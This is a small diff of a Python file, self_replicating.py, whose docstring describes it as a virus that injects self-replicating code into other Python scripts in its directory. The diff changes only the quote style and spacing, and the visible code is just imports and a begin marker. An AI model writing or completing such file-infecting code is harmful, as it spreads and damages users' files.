@@ -1,10 +1,11 @@
-''' 
+""" 
 self_replicating.py
     
     - This script will inject self replicating (a virus) code into any existing python scripts in its current directory.
-'''
+"""
 
 import glob
+
 ### BEGIN ###
 import sys
 from typing import List
